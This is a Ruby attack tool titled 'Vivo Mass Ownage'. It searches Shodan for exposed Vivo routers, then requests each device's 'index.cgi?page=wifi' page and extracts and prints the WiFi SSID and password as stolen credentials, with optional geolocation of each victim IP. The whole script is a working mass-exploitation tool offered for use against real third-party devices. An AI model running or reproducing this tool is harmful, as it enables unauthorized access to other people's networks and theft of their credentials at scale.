require 'net/http'
require 'json'
require 'shodan'
require 'open-uri'
require 'optparse'

$headers = {"user-agent" => "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36"}
puts "Install shodan gem \n gem install shodan"
class String
    def red; colorize(self, "\e[1m\e[31m"); end
    def green; colorize(self, "\e[1m\e[32m"); end
    def dark_green; colorize(self, "\e[32m"); end
    def yellow; colorize(self, "\e[1m\e[33m"); end
    def blue; colorize(self, "\e[1m\e[34m"); end
    def dark_blue; colorize(self, "\e[34m"); end
    def purple; colorize(self, "\e[35m"); end
    def dark_purple; colorize(self, "\e[1;35m"); end
    def cyan; colorize(self, "\e[1;36m"); end
    def dark_cyan; colorize(self, "\e[36m"); end
    def pure; colorize(self, "\e[0m\e[28m"); end
    def bold; colorize(self, "\e[1m"); end
    def colorize(text, color_code) "#{color_code}#{text}\e[0m" end
  end

  options = {:key => nil, :search => nil}
  parser = OptionParser.new do|opts|
      opts.banner = "ruby vivo_exploit.rb -k your_key -s \"org:\'vivo\' /wizard\""
      opts.on("-s n", '--search=n', 'Search') do |search|
          options[:search] = search;
      end
      opts.on('-k n', '--key=n', 'Shodan Key') do |key|
          options[:key] = key;
      end
      opts.on('-h', '--help', 'Displays Help') do
          puts opts
          exit
      end
  end  
  parser.parse!

  #get values from input
  $key = options[:key]
  $search = options[:search]
  puts $key
  puts $search

def get_ips_info(ip) 
    puts "TARGET: #{ip}".green
    url_geo = 'http://ip-api.com/json/' + ip
    url = URI(url_geo)
    res = Net::HTTP.get_response(url)
    #puts res.body #DEBUG
    my_hash = JSON.parse(res.body)
    puts my_hash["city"].green
    puts my_hash["country"].green
    puts my_hash["regionName"].green
    puts my_hash["timezone"].green
    puts my_hash["country"].green
    puts my_hash["isp"].green
    puts "Long: #{my_hash["lon"]}".green
    puts "Lat:#{my_hash["lon"]}".green
end

def shodan_api_getter(ip,hostname,domain,city)
    puts "INFORMATIONS TARGET: #{ip}".red
    city.select do |k,v| 
        puts "#{k}:#{v}".green
    end 
    puts "HOST: #{hostname.join}".green
    puts "DOMAIN: #{domain.join}".green
end


def shodan_parser()
    shodan_api = Shodan::Shodan.new($key)
    result = shodan_api.search($search)
    #puts "#{result}" #debug
    result['matches'].each{|host| 
        ip = host['ip_str']
        port = host['port']
        hostname = host['hostnames']
        domain = host['domains']
        city = host['location']
        xpt(ip,port)
        shodan_api_getter(ip,hostname,domain,city)
    }
end


def xpt(ip,port)

    path = ['index.cgi?page=wifi']

    for i in path
            begin 
            puts "Try to connect http://#{ip}:#{port}".yellow
            payload = "http://"+ip+":"+port.to_s+"/"+path.join
            html = open(payload,'User-Agent' => 'Mozilla').read
            split_html = html.split('&')
            ssid = split_html[1]
            password = split_html[3]
            puts 
            puts "--> Credentials: #{ssid} : #{password}".red
            puts
            #get_ips_info(ip)
            rescue
                next
            end

            begin 
                puts "Try to connect https://#{ip}:#{port}".cyan
                payload = "https://"+ip+":"+port.to_s+"/"+path.join
                html = open(payload,'User-Agent' => 'Mozilla').read
                split_html = html.split('&')
                ssid = split_html[1]
                password = split_html[3]
                puts 
                puts "--> Credentials: #{ssid} : #{password}".red
                puts
                #get_ips_info(ip)
                rescue
                #puts "Connection Error".red
                next
            end
    end
end


def banner()
    puts " _    ___                __  ___               "
    puts "| |  / (_)   ______     /  |/  /___ ___________"
    puts "| | / / / | / / __ \\   / /|_/ / __ `/ ___/ ___/"
    puts "| |/ / /| |/ / /_/ /  / /  / / /_/ (__  |__  ) "
    puts "|___/_/ |___/\\____/  /_/  /_/\\__,_/____/____/  "
    puts  "\n"                                               
    puts"   ____                                "
    puts"  / __ \\_      ______  ____ _____ ____ "
    puts" / / / / | /| / / __ \\/ __ `/ __ `/ _ \\"
    puts"/ /_/ /| |/ |/ / / / / /_/ / /_/ /  __/"
    puts"\\____/ |__/|__/_/ /_/\\__,_/\\__, /\\___/ "
    puts"                          /____/    "
    puts "By: sp4ce0x1".cyan
end


def main()
    banner()
    shodan_parser()
end

main()
